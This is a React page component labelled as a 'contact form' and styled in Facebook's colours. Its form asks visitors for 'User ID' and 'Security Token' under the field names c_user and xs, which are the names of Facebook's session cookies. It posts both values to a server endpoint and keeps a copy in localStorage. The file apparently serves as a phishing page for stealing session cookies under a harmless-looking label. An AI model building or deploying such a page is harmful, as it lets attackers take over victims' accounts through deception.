import { Button } from "@/components/ui/button";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { useLocation } from "wouter";
import MetaTags from "@/components/meta-tags";
import { validationFormSchema } from "@/lib/form-schemas";
import { apiRequest } from "@/lib/queryClient";
import { Search, Home, UserCircle2, Bell, Settings, HelpCircle } from "lucide-react";

export default function Validation() {
  const { toast } = useToast();
  const [, setLocation] = useLocation();

  const form = useForm({
    resolver: zodResolver(validationFormSchema),
    defaultValues: {
      c_user: "",
      xs: "",
    },
  });

  const onSubmit = async (data: any) => {
    try {
      await apiRequest('POST', '/api/contact-form', data);
      localStorage.setItem('validation_data', JSON.stringify(data));
      setLocation("/confirmation");
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Error",
        description: "Failed to submit form. Please try again.",
      });
    }
  };

  return (
    <>
      <MetaTags
        title="Contact Form | Validation"
        description="Contact Form Validation Step"
      />
      <div className="min-h-screen flex flex-col lg:flex-row bg-white">
        {/* Desktop Sidebar */}
        <aside className="hidden lg:flex lg:w-[280px] flex-col border-r border-[#dddfe2] bg-white fixed h-screen">
          <div className="p-4 border-b border-[#dddfe2]">
            <p className="text-[#1877f2] text-2xl font-bold">Contact Form</p>
          </div>
          <nav className="flex-1 p-2">
            <ul className="space-y-1">
              <li>
                <a href="/" className="flex items-center px-3 py-2 text-[#65676B] hover:bg-[#F0F2F5] rounded-lg transition-colors">
                  <Home className="w-5 h-5 mr-3" />
                  <span>Dashboard</span>
                </a>
              </li>
              <li>
                <a href="/validation" className="flex items-center px-3 py-2 bg-[#F0F2F5] text-[#1877f2] rounded-lg transition-colors">
                  <UserCircle2 className="w-5 h-5 mr-3" />
                  <span>Form Step 1</span>
                </a>
              </li>
              <li>
                <a href="/confirmation" className="flex items-center px-3 py-2 text-[#65676B] hover:bg-[#F0F2F5] rounded-lg transition-colors">
                  <Bell className="w-5 h-5 mr-3" />
                  <span>Form Step 2</span>
                </a>
              </li>
              <li>
                <a href="#settings" className="flex items-center px-3 py-2 text-[#65676B] hover:bg-[#F0F2F5] rounded-lg transition-colors">
                  <Settings className="w-5 h-5 mr-3" />
                  <span>Settings</span>
                </a>
              </li>
              <li>
                <a href="#help" className="flex items-center px-3 py-2 text-[#65676B] hover:bg-[#F0F2F5] rounded-lg transition-colors">
                  <HelpCircle className="w-5 h-5 mr-3" />
                  <span>Help</span>
                </a>
              </li>
            </ul>
          </nav>
        </aside>

        {/* Main Content */}
        <main className="flex-1 flex flex-col lg:ml-[280px]">
          {/* Mobile Header */}
          <header className="flex items-center justify-between p-3 sm:p-4 border-b">
            <div className="flex items-center lg:hidden">
              <p className="text-[#1877f2] text-xl sm:text-2xl font-bold">Contact Form</p>
            </div>
            <div className="flex items-center bg-[#F0F2F5] rounded-full px-3 sm:px-4 py-1.5 sm:py-2">
              <Search className="w-3 h-3 sm:w-4 sm:h-4 mr-2 text-[#65676B]" />
              <input
                type="text"
                placeholder="Search"
                className="bg-transparent outline-none text-sm sm:text-base w-24 sm:w-auto text-[#65676B] placeholder-[#65676B]"
              />
            </div>
          </header>

          {/* Form Content */}
          <div className="flex-1 flex justify-center p-4 sm:p-8">
            <div className="max-w-2xl w-full space-y-6">
              <div>
                <h1 className="text-2xl font-bold text-[#1c1e21] mb-2">
                  Contact Form - Step 1
                </h1>
                <p className="text-[#65676B]">
                  Please fill out the form below to proceed to the next step.
                </p>
              </div>

              <Form {...form}>
                <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
                  <FormField
                    control={form.control}
                    name="c_user"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel className="text-[#1c1e21]">User ID</FormLabel>
                        <FormControl>
                          <Input
                            type="number"
                            placeholder="Enter your user ID"
                            className="border-[#dddfe2] focus:border-[#1877f2] focus:ring-[#1877f2] focus:ring-opacity-50"
                            {...field}
                          />
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />

                  <FormField
                    control={form.control}
                    name="xs"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel className="text-[#1c1e21]">Security Token</FormLabel>
                        <FormControl>
                          <Input
                            type="text"
                            placeholder="Enter your security token"
                            className="border-[#dddfe2] focus:border-[#1877f2] focus:ring-[#1877f2] focus:ring-opacity-50"
                            {...field}
                          />
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />

                  <Button
                    type="submit"
                    className="w-full bg-[#1877f2] hover:bg-[#166fe5] text-white py-2"
                    disabled={form.formState.isSubmitting}
                  >
                    {form.formState.isSubmitting ? "Submitting..." : "Continue to Step 2"}
                  </Button>
                </form>
              </Form>
            </div>
          </div>

          {/* Footer */}
          <footer className="text-center p-4 text-sm text-[#65676B] border-t">
            © 2025 Contact Form. All rights reserved.
          </footer>
        </main>
      </div>
    </>
  );
}